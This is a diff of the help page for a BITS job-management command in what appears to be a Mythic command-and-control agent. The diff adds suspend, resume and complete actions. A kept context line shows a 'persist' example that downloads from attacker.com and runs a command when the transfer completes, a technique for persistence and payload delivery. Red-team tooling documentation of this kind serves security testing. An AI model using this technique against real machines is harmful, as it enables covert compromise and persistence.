@@ -15,8 +15,8 @@ Manage BITS (Background Intelligent Transfer Service) transfer jobs for persiste
 
 | Argument | Required | Default | Description |
 |----------|----------|---------|-------------|
-| action | No | list | `list` — enumerate all BITS jobs. `create` — create a download job. `persist` — create a download job with notification command. `cancel` — remove a job by name |
-| name | Varies | | Display name for the BITS job (required for create/persist/cancel) |
+| action | No | list | `list`, `create`, `persist`, `cancel`, `suspend`, `resume`, or `complete` |
+| name | Varies | | Display name for the BITS job (required for create/persist/cancel/suspend/resume/complete) |
 | url | Varies | | Remote URL to download from (required for create/persist) |
 | path | Varies | | Local file path to save the download (required for create/persist). Must use backslashes |
 | command | Varies | | Program to execute when download completes (required for persist). Full path to executable |
@@ -45,6 +45,21 @@ bits -action persist -name "UpdateCheck" -url "http://attacker.com/data.dat" -pa
 bits -action cancel -name "WindowsUpdate"
 ```
 
+**Suspend a running job:**
+```
+bits -action suspend -name "WindowsUpdate"
+```
+
+**Resume a suspended job:**
+```
+bits -action resume -name "WindowsUpdate"
+```
+
+**Complete a transferred job (finalize download):**
+```
+bits -action complete -name "WindowsUpdate"
+```
+
 ## Output Format
 
 **List** returns a JSON array of BITS jobs (rendered as a sortable table in the Mythic UI with color-coded states):
@@ -56,7 +71,7 @@ bits -action cancel -name "WindowsUpdate"
 ]
 ```
 
-**Create**, **persist**, and **cancel** actions return plain text status messages.
+**Create**, **persist**, **cancel**, **suspend**, **resume**, and **complete** actions return plain text status messages.
 
 ## Operational Notes
 
